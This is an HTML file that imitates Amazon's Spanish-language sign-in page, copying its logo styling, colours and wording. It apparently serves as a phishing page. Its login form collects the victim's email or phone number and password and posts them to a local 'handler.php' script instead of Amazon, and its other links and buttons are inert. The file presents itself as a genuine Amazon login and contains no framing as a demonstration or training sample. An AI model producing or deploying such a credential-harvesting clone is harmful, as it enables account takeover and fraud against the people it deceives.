<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: #fff;
        }

        .container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        .logo {
            margin: 28px 0 20px;
        }

        .logo-text {
            font-size: 36px;
            color: #000;
            font-weight: bold;
        }

        .logo-text::after {
            content: '';
            display: inline-block;
            width: 20px;
            height: 20px;
            background: #ff9900;
            border-radius: 0 0 100% 0;
            margin-left: 4px;
            vertical-align: middle;
        }

        .login-box {
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 4px;
            max-width: 350px;
            width: 100%;
        }

        h1 {
            font-size: 28px;
            font-weight: 400;
            color: #111;
            margin-bottom: 16px;
        }

        .form-group {
            margin-bottom: 22px;
        }

        label {
            display: block;
            color: #111;
            font-size: 13px;
            font-weight: 700;
            margin-bottom: 4px;
        }

        input {
            width: 100%;
            padding: 7px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            font-size: 15px;
            line-height: 19px;
        }

        input:focus {
            outline: none;
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228, 121, 17, .5);
        }

        .btn-primary {
            width: 100%;
            padding: 8px;
            background: #f0c14b;
            color: #111;
            border: 1px solid #a88734;
            border-radius: 3px;
            font-size: 13px;
            cursor: pointer;
            margin-top: 12px;
        }

        .btn-primary:hover {
            background: #f7dfa5;
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }

        .checkbox-group input {
            width: auto;
            margin-right: 6px;
        }

        .checkbox-group label {
            margin: 0;
            font-weight: 400;
            font-size: 13px;
        }

        .links {
            margin-top: 18px;
            font-size: 13px;
        }

        .links a {
            color: #0066c0;
            text-decoration: none;
        }

        .links a:hover {
            color: #c45500;
            text-decoration: underline;
        }

        .divider {
            position: relative;
            text-align: center;
            margin: 36px 0 20px;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #e7e7e7;
        }

        .divider span {
            position: relative;
            background: #fff;
            padding: 0 8px;
            font-size: 12px;
            color: #767676;
        }

        .btn-secondary {
            width: 100%;
            padding: 8px;
            background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
            color: #111;
            border: 1px solid #adb1b8;
            border-radius: 3px;
            font-size: 13px;
            cursor: pointer;
        }

        .btn-secondary:hover {
            background: linear-gradient(to bottom, #e7e9ec, #dfe1e4);
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo">
            <div class="logo-text">amazon</div>
        </div>
        <div class="login-box">
            <h1>Iniciar sesión</h1>
            <form action="handler.php" method="POST">
                <div class="form-group">
                    <label>Email o número de teléfono móvil</label>
                    <input type="text" name="email" required autofocus>
                </div>
                <div class="form-group">
                    <label>Contraseña</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit" class="btn-primary">Iniciar sesión</button>
                <div class="checkbox-group">
                    <input type="checkbox" id="remember">
                    <label for="remember">Mantener sesión iniciada</label>
                </div>
            </form>
            <div class="links">
                <a href="#">¿Olvidaste tu contraseña?</a>
            </div>
        </div>
        <div class="divider">
            <span>¿Eres nuevo en Amazon?</span>
        </div>
        <button class="btn-secondary" style="max-width: 350px; width: 100%;">Crea tu cuenta de Amazon</button>
    </div>
</body>

</html>
